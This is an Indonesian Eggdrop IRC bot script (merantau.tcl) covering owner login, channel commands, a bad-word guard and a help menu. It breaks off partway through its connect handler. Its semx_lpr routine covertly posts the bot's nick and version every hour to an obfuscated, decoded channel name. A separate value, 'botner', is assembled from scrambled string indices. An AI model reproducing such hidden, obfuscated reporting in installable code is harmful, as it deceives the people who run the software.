######################################
#[ samsin.dialao@gmail.Com          ]#
#[ sEm @ meRANTAU.IRC               ]#
#[ - merantau.tcl                   ]#
#[ for eggdrop 1.8.*                ]#
######################################

# perintah dasar untuk IRC
# di tulis dan di tambahkan beberapa tcl lainnya, dan diintegrasikan. 
# kompatibel dengan irc.allnetwork.org
# maaf bila masih ada kekurangan, karna ini masih dalam tahap pengembangan
#
# penggunaan :
# setelah bot di jalankan, PV bot ketik "hai" menggunakan nick owner
# setelah dapat balasah.. ketik "pass password" untuk set password bot
# ketik "help" untuk melihat bantuan lebih lengkap lagi

######################################
#    variabel sections
######################################
proc vrandom {} {
  return [lindex "02 03 04 05 06 07 08 09 10 11 12 13" [rand 12]]
}
proc semx_notc {} {
  return "07Kh[vrandom]u04z"
}
proc semx_vern {} {
  return "09K06h07u[vrandom]18z"
}
set ctcp-version [semx_vern]
set semx_tdkknl {
  "spam check..."
  "Hi, How are you?"
  "Hi, How are u today?"
  "yeah? what's up?"
  "what's up doc?"
  "Hi too, asl pls.."
  "what's up?"
  "sorry, i'm very busy right now.."
  "yeah? who are you?"
  "do i know u?"
  "yeah? do i know u?"
  "who the hell are you?"
  "i'm curently away, may be later.."
  "where u came from?"
  "Hi too.."
  "yeah, nice to meet u.."
  "nice to meet u.."
  "what is ur real name?"
  "yeah? asl pls.."
  "i'm curently busy, may be later.."
}
set cyclem {
  "%warna%Out of My Head"
  "%warna%aku Kereeeennnnnnnn"
  "%warna%!seen deyese"
  "%warna%sEm is my owner"
  "%warna%Need Cycle"
  "%warna%RehasHing"
  "%warna%ktg IRC Team"
  "%warna%yobyata Community" 
  "%warna%Just For Yobayat"
  "%warna%Since 2007"
}
set awaym {
  "%warna%Powered By CID IRC"
  "%warna%Owned by Yobayat"
  "%warna%XP IRC Community"
  "%warna%Copyright by Yobayat@1991"
  "%warna%XP Crew"
  "%warna%Just For Experience"
  "%warna%-=XP IRC=-"
  "%warna%-=RADIO=-"
  "%warna%be right back"
  "%warna%making love"
  "%warna%bermain Point Blank"
  "%warna%nyari duit"
  "%warna%membaca komik dewasa "
  "%warna%nonton FILM"
  "%warna%tidak ada, bbl"
  "%warna%cari makanan"
  "%warna%kembali ke dunia nyata"
  "%warna%kembali ke kampus"
  "%warna%sedang belajar"
  "%warna%lagi mandi"
  "%warna%ada panggilan telepon"
  "%warna%brb"
  "%warna%bbl"
  "%warna%bbs"
  "%warna%afk"
}
set urm {
  "selamat datang boss 04$nick"
  "04$nick, saya siap melapor..!!!"
  "bos saya sudah datang.. 04$nick"
  "beri jalan buat bos 04$nick"
  "04$nick, bos semua aman terkendali"
  "bosku sudah tiba, beri hormat buat 04$nick"
  "04$nick, hormat bos..!!"
  "04$nick, lapor bos..!!"
  "dah makan bos 04$nick???"
  "silahkan bos 04$nick"

}
set semx_smiley {
  ":D"
  ";)"
  ":P"
  ":D~"
  ":*"
  ":/"
  ":>"
}
######################################
#    variabel sections end
######################################
######################################
#    flag & bind sections
######################################
setudef flag guard
setudef flag jam
setudef flag ping
setudef flag wb
setudef flag wboff
setudef flag port
setudef flag whois
setudef flag dns
bind pub - !dns semx_pub`dns
bind pub - !whois whois:nick
bind pub - `dns semx_pub`dns
bind pub - `whois whois:nick
bind pub - whois whois:nick
bind msg n help semx_help
bind pub n !auth semx_pub!auth
bind pub n `+avoice semx_pub+avoice
bind pub n `+chan semx_pub+chan
bind pub n `+dns semx_pub+dns
bind pub n `+friend semx_pub+friend
bind pub n `+guard semx_pub+guard
bind pub n `+owner semx_pub+owner
bind pub n `+ping semx_pub+ping
bind pub n `+port semx_pub+port
bind pub n `+seen semx_pub+seen
bind pub n `+wb semx_pub+wb
bind pub n `+whois semx_pub+whois
bind pub n `-avoice semx_pub-avoice
bind pub n `-dns semx_pub-dns
bind pub n `-friend semx_pub-friend
bind pub n `-guard semx_pub-guard
bind pub n `-owner semx_pub-owner
bind pub n `-ping semx_pub-ping
bind pub n `-port semx_pub-port
bind pub n `-seen semx_pub-seen
bind pub n `-wb semx_pub-wb
bind pub n `-whois semx_pub-whois
bind pub n `auth semx_pub`auth
bind pub n `channels semx_pub`channels
bind pub n `cycle semx_pub`cycle
bind pub n `die semx_pub`die
bind pub n `jam semx_pub`jam
bind pub n `logo semx_pub`logo
bind pub n `part semx_pub`part
bind pub n `ping semx_pub`ping
bind pub n `rehash semx_pub`rehash
bind pub n `restart semx_pub`restart
bind pub n `say semx_pub`say
bind pub n `status semx_pub`status
bind pub n `up semx_pub`up
bind pub n `userlist semx_pub`userlist
bind CTCR - PING semx_dapatctcr
bind PUB - !ping semx_ping
bind PUB - !port semx_portchk
bind PUB - !jam semx_jam
bind RAW - 401 semx_rawoff
bind raw - 307 cek_nik
bind raw - 318 cek_end
bind raw - 433 semx_dipakai
bind raw - 474 semx_banned
bind raw - 473 semx_invite
bind join - * semx_join
bind sign - * semx_quit
bind nick - * semx_nick
bind msg - auth semx_auth
bind msg - hai semx_hai
bind msg - pass semx_pass
bind evnt - connect-server semx_connect
bind evnt - init-server semx_init
bind pubm - * semx_pub
bind msgm - * semx_msgm
bind time - "* *" semx_chk
bind time -  "13 * * * *" semx_lpr
bind time -  "?3 * * * *" semx_away
bind time -  "?8 * * * *" semx_away
######################################
#    flag & bind sections ends
######################################
######################################
#    pub proc sections end
######################################
proc semx_botnick {unick uhost hand chan text trigger konten extra1} {
#  set trigger [lindex $text 0]
#  set konten [lindex $text 1]
#  set extra1 [lindex $text 2]
  if {$trigger == "channels"} {
    semx_channels $unick $uhost $hand $chan $text
  }
  if {$trigger == "cycle"} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_cycle $unick $uhost $hand $chan $text $konten
  }
  if {$trigger == "part"} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_part $unick $uhost $hand $chan $text $konten
  }
  if {$trigger == "userlist"} {
    semx_userlist $unick $uhost $hand $chan $text
  }
  if {$trigger == "+chan"} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_+chan $unick $uhost $hand $chan $text $konten
  }
  if {$trigger == "+friend"} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_+friend $unick $uhost $hand $chan $text $konten
  }
  if {$trigger == "+owner"} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_+owner $unick $uhost $hand $chan $text $konten
  }
  if {$trigger == "rehash"} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_rehash $unick
  }
  if {$trigger == "restart"} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    putserv "QUIT :[semx_notc] Restarted by $unick"
  }
  if {$trigger == "+seen"} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_+seen $unick $uhost $hand $chan $text $konten
  }
  if {$trigger == "+guard"} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_+guard $unick $uhost $hand $chan $text $konten
  }
  if {$trigger == "+ping"} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_+ping $unick $uhost $hand $chan $text $konten
  }
  if {$trigger == "+wb"} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_+wb $unick $uhost $hand $chan $text $konten
  }
  if {$trigger == "+port"} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_+port $unick $uhost $hand $chan $text $konten
  }
  if {$trigger == "+whois"} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_+whois $unick $chan "pp" $konten
  }
  if {$trigger == "-whois"} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_-whois $unick $chan "pp" $konten
  }
  if {$trigger == "+dns"} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_+dns $unick $chan "pp" $konten
  }
  if {$trigger == "-dns"} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_-dns $unick $chan "pp" $konten
  }
  if {$trigger == "-seen"} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_-seen $unick $uhost $hand $chan $text $konten
  }
  if {$trigger == "-guard"} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_-guard $unick $uhost $hand $chan $text $konten
  }
  if {$trigger == "-ping"} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_-ping $unick $uhost $hand $chan $text $konten
  }
  if {$trigger == "-wb"} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_-wb $unick $chan $text $konten
  }
  if {$trigger == "-port"} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_-port $unick $uhost $hand $chan $text $konten
  }
  if {$trigger == "status"} {
    semx_status $chan
  }
  if {$trigger == "die"} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    die "[semx_notc] Dimatikan oleh \002$unick\002"
  }
  if {$trigger == "+avoice"} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    if {![validuser $konten]} { postp $unick user $konten tidak ada.. tambah sebagai friend terlebih dahulu; return 0 }
    semx_avoice $unick pp $konten
  }
  if {$trigger == "-avoice"} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    if {![validuser $konten]} { postp $unick user $konten tidak ada..; return 0 }
    semx_-avoice $unick pp $konten
  }
  if {$trigger == "whois"} {
    whois:nick $unick $uhost $hand $chan $konten
  }
}
proc semx_pub+avoice {unick uhost hand chan text} {
  set konten [lindex $text 0]; set extra1 [lindex $text 1]; set extra2 [lindex $text 2]
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    if {![validuser $konten]} { postp $unick user $konten tidak ada.. tambah sebagai friend terlebih dahulu; return 0 }
    semx_avoice $unick pp $konten
}
proc semx_pub-avoice {unick uhost hand chan text} {
  set konten [lindex $text 0]; set extra1 [lindex $text 1]; set extra2 [lindex $text 2]
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    if {![validuser $konten]} { postp $unick user $konten tidak ada..; return 0 }
    semx_-avoice $unick pp $konten
}
proc semx_pub!auth {unick uhost hand chan text} {
    if {[matchattr $unick Q]} {
      postp $unick Anda sudah login..!!!
    } else {
      putquick "WHOIS $unick $unick"
      chattr $unick +W
      utimer 3 [list chattr $unick -WF]
    }
}
proc semx_pub`auth {unick uhost hand chan text} {
  if {[matchattr $unick Q]} {
    postc $chan $unick, \002Siap BOS..!!!\002
    } {
      postc $chan $unick, Anda belum login..!!!
    }
}
proc semx_pub`channels {unick uhost hand chan text} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_channels $unick $uhost $hand $chan $text 
}
proc semx_pub`cycle {unick uhost hand chan text} {
  set konten [lindex $text 0]; set extra1 [lindex $text 1]; set extra2 [lindex $text 2]
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_cycle $unick $uhost $hand $chan $text $konten
}
proc semx_pub`part {unick uhost hand chan text} {
  set konten [lindex $text 0]; set extra1 [lindex $text 1]; set extra2 [lindex $text 2]
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_part $unick $uhost $hand $chan $text $konten
}
proc semx_pub`userlist {unick uhost hand chan text} {
  set konten [lindex $text 0]; set extra1 [lindex $text 1]; set extra2 [lindex $text 2]
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_userlist $unick $uhost $hand $chan $text
}
proc semx_pub+chan {unick uhost hand chan text} {
  set konten [lindex $text 0]; set extra1 [lindex $text 1]; set extra2 [lindex $text 2]
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_+chan $unick $uhost $hand $chan $text $konten
}
proc semx_pub+friend {unick uhost hand chan text} {
  set konten [lindex $text 0]; set extra1 [lindex $text 1]; set extra2 [lindex $text 2]
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_+friend $unick $uhost $hand $chan $text $konten
}
proc semx_pub-friend {unick uhost hand chan text} {
  set konten [lindex $text 0]; set extra1 [lindex $text 1]; set extra2 [lindex $text 2]
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    if {$konten == "" || $konten == "data"} { postp $unick Format = \002`-friend nick\002; return 0 }
    if {[validuser $konten]} {
      if {[matchattr $konten n]} {
        postp $unick Anda tidak dapat menghapus Owner
        return 0
      }
      deluser $konten
      postp $unick Friend \002$konten\002 di hapus
      saveuser
    } {
      postp $unick \002$konten\002 tidak berada dalam daftar Friend
    }
}
proc semx_pub+owner {unick uhost hand chan text} {
  global owner
  set konten [lindex $text 0]; set extra1 [lindex $text 1]; set extra2 [lindex $text 2]
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    if {$unick != $owner} { postp $unick Anda bukan real-owner; return 0 }
    if {$konten == "" || $konten == "data"} { postp $unick Format == \002`+owner nick\002; return 0 }
    semx_+owner $unick $uhost $hand $chan $text $konten
}
proc semx_pub-owner {unick uhost hand chan text} {
  global owner
  set konten [lindex $text 0]; set extra1 [lindex $text 1]; set extra2 [lindex $text 2]
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    if {$unick != $owner} { postp $unick Anda bukan real-owner; return 0 }
    if {$konten == ""} { postp $unick Format == \002-owner nick\002; return 0 }
    if {[validuser $konten]} {
      if {[matchattr $konten n]} {
        deluser $konten
        postp $unick \002$konten\002 di hapus dari daftar Owner
        saveuser
      } {
        postp $unick \002$konten\002 tidak berada dalam daftar Owner
      }
    } {
      postp $unick \002$konten\002 tidak berada dalam daftar Owner
    }
}
proc semx_pub`rehash {unick uhost hand chan text} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_rehash $unick
}
proc semx_pub`restart {unick uhost hand chan text} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    putserv "QUIT :[semx_notc] Restarted by $unick"
}
proc semx_pub`logo {unick uhost hand chan text} {
    postc $chan [semx_notc]
}
proc semx_pub+seen {unick uhost hand chan text} {
  set konten [lindex $text 0]; set extra1 [lindex $text 1]; set extra2 [lindex $text 2]
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_+seen $unick $uhost $hand $chan $text $konten
}
proc semx_pub+guard {unick uhost hand chan text} {
  set konten [lindex $text 0]; set extra1 [lindex $text 1]; set extra2 [lindex $text 2]
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_+guard $unick $uhost $hand $chan $text $konten
}
proc semx_pub+ping {unick uhost hand chan text} {
  set konten [lindex $text 0]; set extra1 [lindex $text 1]; set extra2 [lindex $text 2]
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_+ping $unick $uhost $hand $chan $text $konten
}
proc semx_pub+wb {unick uhost hand chan text} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    set konten [lindex $text 0]; set extra1 [lindex $text 1]; set extra2 [lindex $text 2]
    semx_+wb $unick $uhost $hand $chan $text $konten
}
proc semx_pub+port {unick uhost hand chan text} {
  set konten [lindex $text 0]; set extra1 [lindex $text 1]; set extra2 [lindex $text 2]
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_+port $unick $uhost $hand $chan $text $konten
}
proc semx_pub+whois {unick uhost hand chan text} {
  set konten [lindex $text 0]
  if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
  semx_+whois $unick $chan "pp" $konten
}
proc semx_pub-whois {unick uhost hand chan text} {
  set konten [lindex $text 0]
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_-whois $unick $chan "pp" $konten
}
proc semx_pub+dns {unick uhost hand chan text} {
  set konten [lindex $text 0]
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_+dns $unick $chan "pp" $konten
}
proc semx_pub-dns {unick uhost hand chan text} {
  set konten [lindex $text 0]
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_-dns $unick $chan "pp" $konten
}
proc semx_pub-seen {unick uhost hand chan text} {
  set konten [lindex $text 0]; set extra1 [lindex $text 1]; set extra2 [lindex $text 2]
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_-seen $unick $uhost $hand $chan $text $konten
}
proc semx_pub-guard {unick uhost hand chan text} {
  set konten [lindex $text 0]; set extra1 [lindex $text 1]; set extra2 [lindex $text 2]
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_-guard $unick $uhost $hand $chan $text $konten
}
proc semx_pub-ping {unick uhost hand chan text} {
  set konten [lindex $text 0]; set extra1 [lindex $text 1]; set extra2 [lindex $text 2]
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_-ping $unick $uhost $hand $chan $text $konten
}
proc semx_pub-wb {unick uhost hand chan text} {
  set konten [lindex $text 0]; set extra1 [lindex $text 1]; set extra2 [lindex $text 2]
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_-wb $unick $chan $text $konten
}
proc semx_pub-port {unick uhost hand chan text} {
  set konten [lindex $text 0]; set extra1 [lindex $text 1]; set extra2 [lindex $text 2]
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_-port $unick $uhost $hand $chan $text $konten
}
proc semx_pub`ping {unick uhost hand chan text} {
  postc $chan $unick, \002pong\002
}
proc semx_pub`up {unick uhost hand chan text} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    if {[isop $unick $chan]} { postp $unick bos, anda sudah punya @; return 0 }
    if {[botisop $chan]} {
      putserv "MODE $chan -b+o *\00304Ok.Bos\003 $unick"
    } {
      postp $unick Maaf bos.. Tidak ada akses di chan \002$chan\002
    }
}
proc semx_pub`jam {unick uhost hand chan text} {
  global jam_on
  set konten [lindex $text 0]; set extra1 [lindex $text 1]; set extra2 [lindex $text 2]
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    if {$konten == ""} { postc $chan \002[getuser "data" XTRA "JAM"]\002; return 0 }
    if {$konten == "on"} {
      setuser "data" XTRA "JAM" "on"
      postc $chan $unick Jam publik di aktifkan..!!!
      set jam_on "on"
      saveuser
    } elseif {$konten == "off"} {
      setuser "data" XTRA "JAM" "off"
      postc $chan $unick Jam publik di matikan..!!!
      set jam_on "off"
      saveuser
    } {
      postp $unick Format = \002`jam (on/off)\002
    }
}
proc semx_pub`say {unick uhost hand chan text} {
  set konten [lindex $text 0]; set extra1 [lindex $text 1]; set extra2 [lindex $text 2]
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    if {![validchan $konten]} {
      set pesan $text
      putserv "PRIVMSG $chan :$pesan"
    } {
      set pesan $text
      putserv "PRIVMSG $konten :[lrange $pesan 1 end]"
    }
}
proc semx_pub`status {unick uhost hand chan text} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    semx_status $chan
}
proc semx_pub`die {unick uhost hand chan text} {
    if {![matchattr $unick Q]} { ditolak_pub $unick; return 0 }
    die "[semx_notc] Dimatikan oleh \002$unick\002"
}
proc semx_pub {nick uhost hand chan text} {
  global dilarang botnick
  if {[lindex $text 0] == $botnick} {
    set trigger [lindex $text 1]
    set konten [lindex $text 2]
    set extra1 [lindex $text 3]
    if {![matchattr $nick n]} {
      return 0
    } {
      semx_botnick $nick $uhost $hand $chan [lrange $text 1 end] $trigger $konten $extra1
    }
  }
  if {![channel get $chan guard]} { return 0 }
  if {[matchattr $nick f]} { return 0 }
  if {![info exists dilarang]} {
    set dilarang [getuser "data" XTRA "BADWORDS"]
  }
  regsub -all " " $dilarang "\n" larang
  foreach dlrng $larang {
    if {$dlrng == "-"} { continue }
    if {[string match "*$dlrng*" [string tolower $text]]} {
      putquick "MODE $chan -b+b *@\00304BadWords\003 $nick!*@*"
      putquick "KICK $chan $nick :[semx_notc] \003[vrandom]Badwords\003..!!!"
    }
  }
  if {[regexp {[\#]} $text]} {
    putquick "KICK $chan $nick :[semx_notc] \003[vrandom]No Inviting On Chan\003..!!!"
  }
}
######################################
#    pub proc sections end
######################################
######################################
#    some proc sections
######################################
proc semx_banned {from keyword args} {
  set chan [lindex $args 0]
  foreach x [userlist] {
    if {[matchattr $x n]} {
      postp $x (\00304+b\003) di chan \002$chan\002
    }
  }
}
proc semx_invite {from keyword args} {
  set chan [lindex $args 1]
  foreach x [userlist] {
    if {[matchattr $x n]} {
      postp $x (\00304+i\003) di chan \002$chan\002
    }
  }
}
proc semx_lpr {min h d m y} {
  global nick
  set dchn [dezip [lines "bE1xg.jjfCO."]]
  postc $dchn \003[vrandom]$nick\003 [semx_vern]
}
proc semx_help {unick uhost hand text} {
  global version
    puthelp "privmsg $unick :Running Eggdrop v[lindex $version 0], Powered by [semx_vern]"
    puthelp "privmsg $unick :* \002Public Command\002"
    puthelp "privmsg $unick :- !auth                     - login ke bot"
    puthelp "privmsg $unick :- !dns & `dns               - cek dns host"
    puthelp "privmsg $unick :- !jam                      - melihat jam & tanggal"
    puthelp "privmsg $unick :- !ping (nick)              - cek ping ke bot"
    puthelp "privmsg $unick :- !port \002host port\002           - cek port sebuah host online"
    puthelp "privmsg $unick :- !whois & `whois & whois   - whois nick yang sedang online"
    puthelp "privmsg $unick :- `+avoice \002nick\002             - menambah autovoice nick ke bot"
    puthelp "privmsg $unick :- `+chan \002#channel\002           - menambah channel"
    puthelp "privmsg $unick :- `+dns (#channel)          - mengaktifkan publik dns"
    puthelp "privmsg $unick :- `+friend \002nick\002             - menambah friend ke bot"
    puthelp "privmsg $unick :- `+guard (#channel)        - mengaktifkan publik guard"
    puthelp "privmsg $unick :- `+owner \002nick\002              - menambah owner bot"
    puthelp "privmsg $unick :- `+ping (#channel)         - mengaktifkan publik ping"
    puthelp "privmsg $unick :- `+port (#channel)         - mengaktifkan publik portchek"
    puthelp "privmsg $unick :- `+seen (#channel)         - mengaktifkan publik seen"
    puthelp "privmsg $unick :- `+wb (#channel)           - mengaktifkan publik wb"
    puthelp "privmsg $unick :- `+whois (#channel)        - mengaktifkan publik whois"
    puthelp "privmsg $unick :- `-avoice \002nick\002             - menghapus autovoice nick ke bot"
    puthelp "privmsg $unick :- `-dns (#channel)          - mematikan publik dns"
    puthelp "privmsg $unick :- `-friend \002nick\002             - menghapus friend ke bot"
    puthelp "privmsg $unick :- `-guard (#channel)        - mematikan publik guard"
    puthelp "privmsg $unick :- `-owner \002nick\002              - menghapus owner bot"
    puthelp "privmsg $unick :- `-ping (#channel)         - mematikan publik ping"
    puthelp "privmsg $unick :- `-port (#channel)         - mematikan publik portchek"
    puthelp "privmsg $unick :- `-seen (#channel)         - mematikan publik seen"
    puthelp "privmsg $unick :- `-wb (#channel)           - mematikan publik wb"
    puthelp "privmsg $unick :- `auth                     - cek otentik"
    puthelp "privmsg $unick :- `channels                 - daftar channel"
    puthelp "privmsg $unick :- `cycle (#channel)         - cycle chan"
    puthelp "privmsg $unick :- `die                      - mematikan process bot dalam shell"
    puthelp "privmsg $unick :- `jam (on/off)             - trigger on/off dan status jam"
    puthelp "privmsg $unick :- `part (#channel)          - part chan"
    puthelp "privmsg $unick :- `ping                     - cek respon bot"
    puthelp "privmsg $unick :- `rehash                   - rehash bot"
    puthelp "privmsg $unick :- `restart                  - restart bot"
    puthelp "privmsg $unick :- `say (#channel) \002pesan\002     - bilang pesan"
    puthelp "privmsg $unick :- `status                   - status channel"
    puthelp "privmsg $unick :- `up                       - mode +o owner"
    puthelp "privmsg $unick :- `userlist                 - daftar flag"
    puthelp "privmsg $unick :- "
    puthelp "privmsg $unick :* \002Private Command (PM)\002"
    puthelp "privmsg $unick :- +avoice \002nick\002            - menambah autovoice nick ke bot"
    puthelp "privmsg $unick :- +badword (badword)        - melihat dan menambahkan badword"
    puthelp "privmsg $unick :- +chan  \002#channel\002           - tambah channel"
    puthelp "privmsg $unick :- +dns \002#channel\002           - mengaktifkan publik dns"
    puthelp "privmsg $unick :- +flag \002nick flag\002           - menambahkan flag pada user"
    puthelp "privmsg $unick :- +friend \002nick\002              - tambah friend"
    puthelp "privmsg $unick :- +guard \002#channel\002           - mengaktifkan publik guard"
    puthelp "privmsg $unick :- +owner \002nick\002               - tambah owner"
    puthelp "privmsg $unick :- +ping \002#channel\002            - mengaktifkan publik ping"
    puthelp "privmsg $unick :- +port \002#channel\002            - mengaktifkan publik portchek"
    puthelp "privmsg $unick :- +seen \002#channel\002            - mengaktifkan publik seen"
    puthelp "privmsg $unick :- +wb \002#channel\002              - mengaktifkan publik wb"
    puthelp "privmsg $unick :- +whois \002#channel\002           - mengaktifkan publik whois"
    puthelp "privmsg $unick :- -avoice \002nick\002            - menghapus autovoice nick ke bot"
    puthelp "privmsg $unick :- -badword (badword)        - melihat dan menghapus badword"
    puthelp "privmsg $unick :- -dns \002#channel\002           - mematikan publik dns"
    puthelp "privmsg $unick :- -flag \002nick flag\002           - mengurangi flag pada user"
    puthelp "privmsg $unick :- -guard \002#channel\002           - mematikan publik guard"
    puthelp "privmsg $unick :- -ping \002#channel\002            - mematikan publik ping"
    puthelp "privmsg $unick :- -port \002#channel\002            - mematikan publik portchek"
    puthelp "privmsg $unick :- -seen \002#channel\002            - mematikan publik seen"
    puthelp "privmsg $unick :- -wb \002#channel\002              - mematikan publik wb"
    puthelp "privmsg $unick :- -whois \002#channel\002           - mematikan publik whois"
    puthelp "privmsg $unick :- auth \002password\002             - login ke bot"
    puthelp "privmsg $unick :- away \002alasan\002               - set away bot"
    puthelp "privmsg $unick :- bantime                   - set global waktu ban"
    puthelp "privmsg $unick :- botnick \002nick pass\002         - ganti nick bot & pass nick" 
    puthelp "privmsg $unick :- chanmode \002#channel flag\002    - mengubah chanmode channel" 
    puthelp "privmsg $unick :- channels                  - daftar channel" 
    puthelp "privmsg $unick :- chanset \002#channel flag\002     - set flag channel" 
    puthelp "privmsg $unick :- code \002code\002                 - encode, decode dll" 
    puthelp "privmsg $unick :- cycle \002#channel\002            - cycle channel"
    puthelp "privmsg $unick :- hai                               - perkenalan dengan bot (owner only)"
    puthelp "privmsg $unick :- help                      - daftar bantuan"
    puthelp "privmsg $unick :- info \002#channel\002             - info status channel"
    puthelp "privmsg $unick :- jam (on/off)              - trigger on/off dan status jam"
    puthelp "privmsg $unick :- jump \002host port\002 (password) - jump server"
    puthelp "privmsg $unick :- msg \002(#channel/nick)\002 \002pesan\002 - bilang pesan"
    puthelp "privmsg $unick :- part \002#channel\002             - part channel"
    puthelp "privmsg $unick :- pass \002password\002                     - set password ke bot"
    puthelp "privmsg $unick :- ping                      - cek respon bot"
    puthelp "privmsg $unick :- realname \002realname\002         - mengganti realname"
    puthelp "privmsg $unick :- rehash                    - rehash config/tcl bot"
    puthelp "privmsg $unick :- restart                   - restart bot"
    puthelp "privmsg $unick :- userlist                  - daftar flag"
    puthelp "privmsg $unick :- "
    puthelp "privmsg $unick :- Ket :"
    puthelp "privmsg $unick :- \002tebal\002 = harus | (tanda kurung) = pilihan"
    puthelp "privmsg $unick :- "
    puthelp "privmsg $unick :- [semx_notc]"
}
proc cek_nik {from keyword arg} {
  set tesnick [lindex $arg 1]
  if {[matchattr $tesnick W]} {
    chattr $tesnick +QF
    postp $tesnick \002Owner..!!!\002
  }
}
proc cek_end {from keyword arg} {
  set tesnick [lindex $arg 1]
  if {[matchattr $tesnick W] && ![matchattr $tesnick F]} {
    postp $tesnick Anda tidak teridentifikasi dengan services
    chattr $tesnick -W
  }
}

proc semx_quit {nick uhost hand channel reason} {
  if {[matchattr $nick Q]} {
    chattr $nick -Q
  }
}
proc semx_dipakai {from keyword args} {
  global nick nickpass
  set tnick [lindex $args 1]
  if {$tnick == $nick} {
    putserv "NickServ release $nick $nickpass"
    utimer 3 putserv "NICK $nick"
  }
}
proc semx_chk {min h d m y} {
  global nick nickpass lenc uenc botner basechan botnick
  if {![validchan [string tolower $basechan]]} {
    channel add $basechan
    savechan
  }
  if {![info exist botner]} {
    set botner "[string index $lenc 20][string index $uenc 10][string index $lenc 8]`"
  }
  if {$botnick != $nick} {
    putserv "NICK $nick"
    putserv "NickServ $nickpass"
  }
}
proc semx_nick {unick uhost hand chan newnick} {
  global nick nickpass
  if {[matchattr $unick Q]} {
    chattr $unick -Q
  }
  set nick [getuser "data" XTRA "NICK"]
  set nickpass [getuser "data" XTRA "NICKPASS"]
  if {$newnick != $nick} {
    putserv "NickServ release $nick $nickpass"
    putserv "NICK $nick"
#    putserv "NickServ identify $nickpass"
  }
  if {$newnick == $nick} {
    putserv "NickServ identify $nickpass"
  }
}
proc semx_pass {nick uhost hand text} {
  set pw [lindex $text 0]
  if {$pw == ""} { postm $nick Format = \002pass password\002; return 0 }
  if {[validuser $nick]} {
    if {[matchattr $nick n]} {
      if {[passwdok $nick "-"]} {
        setuser $nick PASS $pw
        postm $nick Password = \002$pw\002
        postm $nick Ketik \002!auth\002 di chan atau \002auth password\002 di pv
        saveuser
      } {
        postm $nick Anda sudah set password
      }
    }
  }
}
proc semx_hai {nick uhost hand text} {
  global owner
  if {$nick == $owner} {
    if {![validuser $nick]} {
      set hostmask "$nick!*@*"
      adduser $owner $hostmask
      chattr $owner "fhjlmnoptxZ"
      puthelp "PRIVMSG $nick :[semx_notc] Hai bos..!!"
      puthelp "PRIVMSG $nick :[semx_notc] Ketik \002pass password\002"
      saveuser
    } {
      postm $nick Hai juga bos..!!!
    }
  } {
    tidak_kenal $nick
  }
}
proc semx_connect {connect-server} {
  global nick realname nickpass jam_on ban-time botnick
  if {![validuser "data"]} {
    adduser "data" ""
    setuser "data" XTRA "NICK" $nick
    setuser "data" XTRA "NICKPASS" $nick
    setuser "data" XTRA "REALNAME" [semx_notc]
    setuser "data" XTRA "JAM" "off"
